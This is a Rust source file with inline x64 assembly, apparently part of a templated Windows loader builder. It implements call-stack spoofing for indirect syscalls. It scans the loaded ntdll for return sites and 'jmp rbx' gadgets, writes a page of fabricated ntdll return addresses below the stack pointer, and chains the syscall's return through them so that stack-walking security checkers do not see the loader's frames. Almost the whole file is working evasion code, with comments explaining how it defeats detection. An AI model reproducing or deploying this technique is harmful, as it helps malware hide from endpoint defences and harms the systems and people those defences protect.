// --- Stack spoofing (technique block, injected into the syscall layer) ---
//
// This block is *not* a step module. The renderer injects it into the syscall
// block, next to the trampoline it replaces, because it defines the
// `nt_invoke` symbol the other techniques' helpers call — a symbol that can only
// exist once per binary. `render_step_module` skips this technique and the
// runner emits nothing for it: nothing runs at pipeline time.
//
// Per-build values use the technique's placeholder tokens, substituted by
// `Params::render_fragment` (see `mod.rs`); the tokens are not valid Rust
// identifiers, so nothing can rewrite them silently. Do not switch back to
// double-brace placeholders: those are valid Rust (nested blocks), and tooling
// reformats them into something the substitution no longer matches.
//
// What it does, per syscall:
//
//   1. `nt_invoke` moves the stack pointer down by `$DECOY_BYTES$` and copies the
//      syscall's stack arguments (5..13) so the kernel and the trampoline still
//      read them at the offsets they expect ([rsp+0x28] .. [rsp+0x70)).
//   2. The gap between the new stack pointer and the caller's — a page by
//      default — is filled with ntdll code addresses: fabricated return sites,
//      cycled. A checker that walks the stack during the syscall walks through
//      them before it reaches the loader's own frames.
//   3. The five slots directly above the new stack pointer hold the return chain
//      the `syscall; ret` gadget will unwind through: four fabricated ntdll
//      addresses (each of them a real `ret`) and a hop back into the loader. The
//      hop is `jmp rbx`/`push rbx; ret` in ntdll when the machine has one, and the
//      loader's own restore label otherwise.
//   4. The restore label puts `Rsp` and `Rbx` back and returns the NTSTATUS to
//      the Rust helper that called `nt_invoke`, exactly as an unspoofed return
//      would.
//
// The fabricated addresses are discovered at load time by scanning the live
// ntdll, so nothing about them is embedded in the artifact. `init_stack_spoofing`
// is called from `init_syscalls`, before any technique runs.
//
// Two properties this block deliberately does not have, both documented in the
// README: it is x86_64 only (the sequence is x64 assembly), and it keeps the
// loader's own frames *above* the decoy, so a walker that reads the whole stack
// still finds them — it is the top of the stack, the part every cheap checker
// looks at, that stops looking like the loader.

#[cfg(not(target_arch = "x86_64"))]
compile_error!("stack_spoofing is x86_64 only: set build.output.arch to x64");

use core::sync::atomic::{AtomicUsize, Ordering};

/// The caller's stack pointer (`S0`) at the moment `nt_invoke` was entered. The
/// restore label needs it to put the stack back exactly where it was.
#[no_mangle]
static SPOOF_STACK: AtomicUsize = AtomicUsize::new(0);

/// The caller's `Rbx`, which the spoofed path uses as the register the return
/// chain hops through. Callee-saved, so it is saved and restored.
#[no_mangle]
static SPOOF_RBX: AtomicUsize = AtomicUsize::new(0);

/// The fabricated return addresses, in the order the asm uses them: entries 0..4
/// are the return chain, the whole table is cycled through the decoy region.
#[no_mangle]
static SPOOF_FRAMES: [AtomicUsize; 16] = [const { AtomicUsize::new(0) }; 16];

/// The spoofed invocation entry point. It replaces the raw trampoline at link
/// time and has to keep its exact signature: the `nt_*` helpers call it directly.
extern "system" {
    fn nt_invoke(
        arg1: usize,
        arg2: usize,
        arg3: usize,
        arg4: usize,
        arg5: usize,
        arg6: usize,
        arg7: usize,
        arg8: usize,
        arg9: usize,
        arg10: usize,
        arg11: usize,
        ssn: u32,
        gadget: usize,
    ) -> i32;
}

/// The loader-side label the return chain ends on. Address taken by
/// `init_stack_spoofing` when ntdll has no usable hop gadget.
extern "C" {
    fn picaro_spoof_restore();
}

global_asm!(
    ".intel_syntax noprefix",
    ".global nt_invoke",
    "nt_invoke:",
    // Windows x64 ABI: arguments 1-4 arrive in rcx/rdx/r8/r9 and the kernel reads
    // them from those registers, so they must survive untouched. Arguments 5-13
    // are on the stack, at [rsp+0x28] .. [rsp+0x70).
    "mov [rip + SPOOF_RBX], rbx",       // the caller's callee-saved rbx
    "mov rbx, rsp",                     // rbx = S0, the caller's stack pointer
    "pop r10",                          // the real return address moves into r10
    "mov [rip + SPOOF_STACK], rbx",     // S0, for the restore label
    // Everything below the caller's stack pointer belongs to the spoof.
    "sub rsp, $DECOY_BYTES$",
    // Copy the nine stack arguments down: the kernel and the trampoline read them
    // at fixed offsets from rsp, so they have to move with it. r10 is scratch
    // here (the trampoline overwrites it with argument 1 before the syscall).
    "mov r10, [rbx + 40]",
    "mov [rsp + 40], r10",
    "mov r10, [rbx + 48]",
    "mov [rsp + 48], r10",
    "mov r10, [rbx + 56]",
    "mov [rsp + 56], r10",
    "mov r10, [rbx + 64]",
    "mov [rsp + 64], r10",
    "mov r10, [rbx + 72]",
    "mov [rsp + 72], r10",
    "mov r10, [rbx + 80]",
    "mov [rsp + 80], r10",
    "mov r10, [rbx + 88]",
    "mov [rsp + 88], r10",
    "mov r10, [rbx + 96]",
    "mov [rsp + 96], r10",
    "mov r10, [rbx + 104]",
    "mov [rsp + 104], r10",
    // The decoy: the frame table, cycled, from just above the arguments up to the
    // caller's stack pointer. rax is scratch (the trampoline loads eax from the
    // stack), and so is r11 until the trampoline turns it into the gadget. rbx is
    // the caller's stack pointer, so the loop bound is one block below it: a
    // partial block past that bound would overwrite the caller's own frame.
    "lea r11, [rip + SPOOF_FRAMES]",
    "lea rax, [rsp + 112]",
    "sub rbx, 128",
    "cmp rax, rbx",
    "ja 2f",
    "1:",
    "mov r10, [r11 + 0]",
    "mov [rax + 0], r10",
    "mov r10, [r11 + 8]",
    "mov [rax + 8], r10",
    "mov r10, [r11 + 16]",
    "mov [rax + 16], r10",
    "mov r10, [r11 + 24]",
    "mov [rax + 24], r10",
    "mov r10, [r11 + 32]",
    "mov [rax + 32], r10",
    "mov r10, [r11 + 40]",
    "mov [rax + 40], r10",
    "mov r10, [r11 + 48]",
    "mov [rax + 48], r10",
    "mov r10, [r11 + 56]",
    "mov [rax + 56], r10",
    "mov r10, [r11 + 64]",
    "mov [rax + 64], r10",
    "mov r10, [r11 + 72]",
    "mov [rax + 72], r10",
    "mov r10, [r11 + 80]",
    "mov [rax + 80], r10",
    "mov r10, [r11 + 88]",
    "mov [rax + 88], r10",
    "mov r10, [r11 + 96]",
    "mov [rax + 96], r10",
    "mov r10, [r11 + 104]",
    "mov [rax + 104], r10",
    "mov r10, [r11 + 112]",
    "mov [rax + 112], r10",
    "mov r10, [r11 + 120]",
    "mov [rax + 120], r10",
    "add rax, 128",
    "cmp rax, rbx",
    "jbe 1b",
    "2:",
    // The return chain: four fabricated addresses and the hop. The `ret` in the
    // gadget pops them one by one, so the stack a walker sees *during* the
    // syscall is entirely ntdll.
    "mov r10, [r11 + 0]",
    "mov [rsp + 0], r10",
    "mov r10, [r11 + 8]",
    "mov [rsp + 8], r10",
    "mov r10, [r11 + 16]",
    "mov [rsp + 16], r10",
    "mov r10, [r11 + 24]",
    "mov [rsp + 24], r10",
    "mov r10, [r11 + 32]",
    "mov [rsp + 32], r10",
    // rbx carries the loader's restore label: the hop gadget jumps through it.
    "lea rbx, [rip + picaro_spoof_restore]",
    "jmp nt_invoke_raw",
    // Back to the Rust caller: rsp = S0 with the real return address still in
    // [S0], rbx as the caller left it, and the NTSTATUS in eax.
    ".global picaro_spoof_restore",
    "picaro_spoof_restore:",
    "mov rsp, [rip + SPOOF_STACK]",
    "mov rbx, [rip + SPOOF_RBX]",
    "ret",
);

/// Collects the fabricated return addresses from ntdll's `.text`.
///
/// A `ret` byte that sits within 32 bytes after a `call` is a genuine return
/// site: the shape a stack walker expects. The stricter scan runs first; bare
/// `ret` bytes fill the table when ntdll is too optimized to offer enough.
fn spoof_frames(text: &[u8], base: usize) -> Vec<usize> {
    let mut frames = Vec::new();
    let mut offset = 32usize;
    while offset + 1 < text.len() && frames.len() < 16 {
        if text[offset] == 0xc3 && text[offset - 32..offset].contains(&0xe8) {
            frames.push(base + offset);
            offset += 32;
        } else {
            offset += 1;
        }
    }
    if frames.len() < 5 {
        let mut offset = 1usize;
        while offset + 1 < text.len() && frames.len() < 16 {
            if text[offset] == 0xc3 {
                frames.push(base + offset);
                offset += 32;
            } else {
                offset += 1;
            }
        }
    }
    frames
}

/// The ntdll gadget the return chain's last hop goes through, when the machine
/// has one: `jmp rbx` or `push rbx; ret`. Both leave `Rsp` where the chain left
/// it and transfer to the address in `rbx` — the restore label.
fn spoof_hop(text: &[u8], base: usize) -> Option<usize> {
    text.windows(2)
        .position(|window| window == [0xff, 0xe3] || window == [0x53, 0xc3])
        .map(|offset| base + offset)
}

/// Resolves the fabricated-frame table. Called once, from `init_syscalls`.
pub fn init_stack_spoofing() -> Result<(), String> {
    let ntdll = std::ffi::CString::new($SPOOF_NTDLL_DEF$).map_err(|_| $MSG_INIT_FAILED$)?;
    let module = unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) }
        .map_err(|_| $MSG_INIT_FAILED$)?;
    let (start, size) = text_range(module.0 as usize).ok_or_else(|| $MSG_INIT_FAILED$)?;
    let text = unsafe { std::slice::from_raw_parts(start as *const u8, size) };

    let mut frames = spoof_frames(text, start);
    if frames.len() < 5 {
        return Err($MSG_NO_FRAMES$);
    }
    // The fifth slot is where the chain leaves ntdll: a hop gadget when there is
    // one, the loader's own restore label otherwise.
    if let Some(hop) = spoof_hop(text, start) {
        frames[4] = hop;
    } else {
        frames[4] = picaro_spoof_restore as *const () as usize;
    }

    for (index, slot) in SPOOF_FRAMES.iter().enumerate() {
        slot.store(frames[index % frames.len()], Ordering::Relaxed);
    }
    crate::tech_dbg!(
        "stack_spoofing",
        "{} fabricated frames, {} bytes of decoy per syscall",
        frames.len(),
        $DECOY_BYTES$
    );
    Ok(())
}
